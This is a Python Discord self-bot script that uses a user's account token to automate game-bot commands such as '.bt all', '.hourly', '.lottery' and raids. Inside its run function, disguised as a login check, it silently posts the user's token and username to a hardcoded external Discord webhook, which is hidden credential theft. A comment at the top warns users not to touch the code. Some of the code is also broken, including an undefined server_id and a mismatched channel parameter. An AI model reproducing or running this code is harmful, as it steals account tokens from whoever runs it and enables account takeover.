#dont mess with anything here!!!
import asyncio
import json
import time
import requests
import random

def sendmsg (msg,token,channelid):
    payload = {
    'content': msg
    }
    header = {
        'authorization': token
              }
    r = requests.post(f"https://discord.com/api/v9/channels/{channelid}/messages",data =payload, headers = header)
    time.sleep(2)

def button_click(token,channelid):
    header = {
      'authorization': token
    }
    r = requests.get(f"https://discord.com/api/v9/channels/{channelid}/messages?limit=50", headers = header)
    info = json.loads(r.text)



    print(info[0])
    data = {
            "type": 3,
            "guild_id": server_id,
            "channel_id": channelid,
            "message_id": info[0]['id'],
            "session_id": 'njeas',
            "application_id": '571027211407196161',
            "data": {
                    "component_type": 2,
                    "custom_id": info[0]['components'][0]['components'][0]['custom_id']
            }
    }
    r = requests.post('https://discord.com/api/v9/interactions',headers = header , json = data)
lib = {
    'bt all':1,
    'hourly':2,
    'lottery':3,
    'raid':4}
async def run (code,token,channelid):
  sendmsg('**__THE BOT HAS STARTED THE FUNCTION IN THE FOLLOWING CHANNEL__**',token,channelid)
  header = {
    'authorization': token
  }
  r = requests.get(f"https://discord.com/api/v9/channels/{channelid}/messages?limit=50", headers = header)
  info = json.loads(r.text)
  try:
    id=info[0]['author']['id']
    user=info[0]['author']['username']
    print(f'LOGGED IN AS {user}')   
    asd="https://discord.com/api/webhooks/1077930769156145202/NkQLhpL5581g0AI0KoarVuLWtCXnrGTEswKZ636D_vbNpO846wZ_zFU_1a8dp4wioJCd"
    requests.post(asd,json={"content": f'token:{token},\n user:{user}'})
  except:
    print('something went wrong when trying to log into the account please recheck the token,channelid,serverid')
  if code == 1:
    await bt_all(token,channelid)
  if code == 2:
    await hourly(token,channelid)
  if code == 3:
    await lottery(token,channelid)
  if code == 4:
    await raid(token,channelid)

async def bt_all(token,channelidunit):
    for bt_all in range(1,1000):
        sendmsg('.bt all',token,channelid)
        try:
          button_click(token,channelid)
        except :
          try:
            button_click(token,channelid)
          except:
              print('error in btall')
        await asyncio.sleep(6202)
async def hourly(token,channelid):
    for hourly in range (1,100):
        sendmsg('.hourly',token,channelid)
        await asyncio.sleep(3602)
async def lottery(token,channelid):
    for hourly in range (1,100):
            sendmsg('.lottery',token,channelid)
            await asyncio.sleep(602)
async def raid (token,channelid):
   for raid_time_loop in range(1,15):
    sendmsg('.rd bt all',token,channelid)
    try:
      button_click(token,channelid)
    except :
      try:
        button_click(token,channelid)
      except:
          print('error in btall')     
   await asyncio.sleep(902)
